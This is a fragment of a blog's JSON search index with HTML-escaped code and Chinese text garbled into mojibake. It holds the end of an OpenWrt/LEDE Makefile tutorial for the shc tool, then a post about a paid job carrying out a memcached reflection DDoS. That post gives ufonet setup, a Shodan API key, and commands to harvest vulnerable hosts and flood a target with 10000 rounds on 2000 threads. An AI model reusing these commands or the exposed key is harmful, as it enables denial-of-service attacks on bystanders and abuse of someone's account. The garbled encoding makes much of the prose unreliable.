class=\"s1\"\u003e# \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# Be very careful of spacing in this file.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# Indents should be tabs, not spaces, and \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# there should be no trailing whitespace in\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# lines that are not commented.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e##############################################\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003einclude $(TOPDIR)/rules.mk\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# Name and release number of this package\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003ePKG_NAME:=shc  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003ePKG_VERSION:=3.8.9b  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003ePKG_MAINTAINER:=Francisco, Rosales, \u0026lt;frosal@fi.upm.es\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# This specifies the directory where we\u0026#39;\u003c/span\u003ere going to build the program.  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# The root build directory, $(BUILD_DIR), is by default the build_mipsel \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# directory in your OpenWrt SDK directory\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePKG_BUILD_DIR :\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003e$(\u003c/span\u003eBUILD_DIR\u003cspan class=\"k\"\u003e)\u003c/span\u003e/\u003cspan class=\"k\"\u003e$(\u003c/span\u003ePKG_NAME\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einclude \u003cspan class=\"k\"\u003e$(\u003c/span\u003eINCLUDE_DIR\u003cspan class=\"k\"\u003e)\u003c/span\u003e/package.mk\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Specify package information for this program. \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# The variables defined here should be self explanatory.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# If you are running Kamikaze, delete the DESCRIPTION \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# variable below and uncomment the Kamikaze define\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# directive for the description below\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edefine Package/\u003cspan class=\"k\"\u003e$(\u003c/span\u003ePKG_NAME\u003cspan class=\"k\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    SECTION:\u003cspan class=\"o\"\u003e=\u003c/span\u003eutils\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    CATEGORY:\u003cspan class=\"o\"\u003e=\u003c/span\u003eUtilities\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    TITLE:\u003cspan class=\"o\"\u003e=\u003c/span\u003e shc ---- This tool generates a stripped binary executable version of the script specified at \u003cspan class=\"nb\"\u003ecommand\u003c/span\u003e line.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    URL:\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://www.datsi.fi.upm.es/~frosal\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eendef\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Uncomment portion below for Kamikaze and delete DESCRIPTION variable above\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edefine Package/\u003cspan class=\"k\"\u003e$(\u003c/span\u003ePKG_NAME\u003cspan class=\"k\"\u003e)\u003c/span\u003e/description  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    shc ---- This tool generates a stripped binary executable version\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        of the script specified at \u003cspan class=\"nb\"\u003ecommand\u003c/span\u003e line.\u003cspan class=\"s2\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eendef\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# Specify what needs to be done to prepare for building the package.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# In our case, we need to copy the source files to the build directory.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# This is NOT the default.  The default uses the PKG_SOURCE_URL and the\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# PKG_SOURCE which is not defined here to download the source from the web.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# In order to just build a simple program that we have just written, it is\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# much easier to do it this way.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003edefine Build/Prepare  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    mkdir -p \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ePKG_BUILD_DIR\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003eCP\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e ./src/* \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ePKG_BUILD_DIR\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e/\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eendef\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# We do not need to define Build/Configure or Build/Compile directives\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# The defaults are appropriate for compiling a simple program such as this one\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# Specify where and how to install the program. Since we only have one file, \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# the helloworld executable, install it by copying it to the /bin directory on\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# the router. The \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003e1\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e variable represents the root directory on the router running \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# OpenWrt. The \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003eINSTALL_DIR\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e variable contains a command to prepare the install \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# directory if it does not already exist.  Likewise \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003eINSTALL_BIN\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e contains the \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# command to copy the binary file from its current location (in our case the build\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# directory) to the install directory.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003edefine Package/\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ePKG_NAME\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e/install  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003eINSTALL_DIR\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003e1\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e/bin\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003eINSTALL_BIN\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ePKG_BUILD_DIR\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e/shc \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003e1\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e/bin/\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eendef\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# This line executes the necessary commands to compile our program.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# The above define directives specify all the information needed, but this\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# line calls BuildPackage which in turn actually uses this information to\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# build a package.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003e\u003cspan class=\"nb\"\u003eeval\u003c/span\u003e \u003cspan class=\"k\"\u003e$(\u003c/span\u003ecall BuildPackage,\u003cspan class=\"k\"\u003e$(\u003c/span\u003ePKG_NAME\u003cspan class=\"k\"\u003e)))\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e8. Compile shc ipk without errors.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003emake package/shc/compile V=99\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e9. Building process complete witout errors.  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eNow we have :  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003ebinary packages directory: source/bin/packages/aarch64_armv8-a/  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e[SHC_BIN] = ./bin/packages/aarch64_armv8-a/base/shc_3.8.9b_aarch64_armv8-a.ipk\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e10. Copy and install SHC .ipk to LEDE device.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003escp shc_3.8.9b_aarch64_armv8-a.ipk root@\u0026lt;LEDE device IP address or name\u0026gt;:/tmp/  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003essh root@\u0026lt;LEDE device IP address or name\u0026gt; #IP usually 192.168.1.1  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eopkg install shc_3.8.9b_aarch64_armv8-a.ipk\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e11. Create test script and compile it to execute. (in LEDE shell)  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003essh root@\u0026lt;LEDE device IP address or name\u0026gt; #IP usually 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003evi /tmp/1.sh  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e#!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eecho \u0026#34;\u003c/span\u003ehahahaha\u003cspan class=\"s2\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eshc -v -f /tmp/1.sh  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e/tmp/1.sh.x\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™é‡Œé¢æœ‰å‡ ä¸ªæ³¨æ„ç‚¹ï¼Œä¸€ä¸ªæ˜¯ç½‘ä¸Šæœ‰å¾ˆå¤šæ•™ç¨‹ï¼Œä¸Šå»å°±æ˜¯\u003c/p\u003e","title":"Freelancerä»»åŠ¡ä¹‹å…­Compile an ipk file on Lede (OpenWRT)"},{"content":"è¿™æ˜¯ä¸€æ¬¡å·®ç‚¹èš€æŠŠç±³çš„è¿‡ç¨‹å•Šï¼Œæœ€åäº‰è®®æ‹¿å›äº†è‡ªå·±çš„æ‰‹ç»­è´¹ï¼Œç™½å¹²äº†ä¸€åœºå•Šï¼ŒçœŸå¤Ÿå€’éœ‰çš„ã€‚\néŸ©å›½äººè¦åå°„æ”»å‡»ã€‚\né¦–å…ˆcloneé¡¹ç›®ï¼š\ngit clone https://github.com/epsylon/ufonet åŸç†å¾ˆæ¸…æ¥šï¼Œé€šè¿‡memcacheçš„æ¼æ´ï¼Œmemcacheå±…ç„¶æ˜¯UDPçš„ï¼Œä¼ªé€ æºåœ°å€ï¼Œå‘ä¸€å †è¯·æ±‚åˆ°æœ‰æ¼æ´çš„memchacheï¼Œå¼•èµ·åå°„æ”»å‡»ã€‚\nä¸€å †æœ‰æ¼æ´çš„æœºå™¨ä»å“ªè·å¾—å‘¢ï¼Ÿè¿™ä¸ªéŸ©å›½äººçœŸçš„æœ‰Shodan APIï¼Œæ‰‹æ¦´å¼¹ï¼Ÿ ä»–çš„è´¦å·ï¼Œç¡®å®å¯ä»¥çœ‹åˆ°ä¸€å †æœ‰æ¯›ç—…çš„æœºå™¨\n0ptoLUtmkSJ8DbAvyZ8PevTRsyLoxEuN å®‰è£…python:\nwget https://www.python.org/ftp/python/2.7.14/Python-2.7.14.tgz tar zxvf Python-2.7.14.tgz cd Python-2.7.14 ./configure --prefix=/export/servers/Python2714 make make install wget -O- \u0026#34;https://bootstrap.pypa.io/get-pip.py\u0026#34; | /export/servers/Python2714/bin/python /export/servers/Python2714/bin/pip install pycurl /export/servers/Python2714/bin/pip install geoip /export/servers/Python2714/bin/pip install whois /export/servers/Python2714/bin/pip install crypto /export/servers/Python2714/bin/pip install request å…ˆå»æ‹¿ä¸€å †æ¼æ´æœºå™¨çš„åˆ—è¡¨\ncd ufonet /export/servers/Python2714/bin/python ./ufonet --sd \u0026#39;botnet/dorks.txt\u0026#39; --sa è½°å‡»ï¼š\n/export/servers/Python2714/bin/python ./ufonet./ufonet -a http://target.com -r 10000 --threads 2000 ","permalink":"https://rendoumi.com/posts/20240124-freelancer_7/","summary":"\u003cp\u003eè¿™æ˜¯ä¸€æ¬¡å·®ç‚¹èš€æŠŠç±³çš„è¿‡ç¨‹å•Šï¼Œæœ€åäº‰è®®æ‹¿å›äº†è‡ªå·±çš„æ‰‹ç»­è´¹ï¼Œç™½å¹²äº†ä¸€åœºå•Šï¼ŒçœŸå¤Ÿå€’éœ‰çš„ã€‚\u003c/p\u003e\n\u003cp\u003eéŸ©å›½äººè¦åå°„æ”»å‡»ã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆcloneé¡¹ç›®ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone https://github.com/epsylon/ufonet  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåŸç†å¾ˆæ¸…æ¥šï¼Œé€šè¿‡memcacheçš„æ¼æ´ï¼Œmemcacheå±…ç„¶æ˜¯UDPçš„ï¼Œä¼ªé€ æºåœ°å€ï¼Œå‘ä¸€å †è¯·æ±‚åˆ°æœ‰æ¼æ´çš„memchacheï¼Œå¼•èµ·åå°„æ”»å‡»ã€‚\u003c/p\u003e\n\u003cp\u003eä¸€å †æœ‰æ¼æ´çš„æœºå™¨ä»å“ªè·å¾—å‘¢ï¼Ÿè¿™ä¸ªéŸ©å›½äººçœŸçš„æœ‰Shodan APIï¼Œæ‰‹æ¦´å¼¹ï¼Ÿ ä»–çš„è´¦å·ï¼Œç¡®å®å¯ä»¥çœ‹åˆ°ä¸€å †æœ‰æ¯›ç—…çš„æœºå™¨\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e0ptoLUtmkSJ8DbAvyZ8PevTRsyLoxEuN  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå®‰è£…python:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://www.python.org/ftp/python/2.7.14/Python-2.7.14.tgz  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf Python-2.7.14.tgz  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e Python-2.7.14  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./configure --prefix\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/servers/Python2714\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake install\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget -O- \u003cspan class=\"s2\"\u003e\u0026#34;https://bootstrap.pypa.io/get-pip.py\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e /export/servers/Python2714/bin/python\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/export/servers/Python2714/bin/pip install 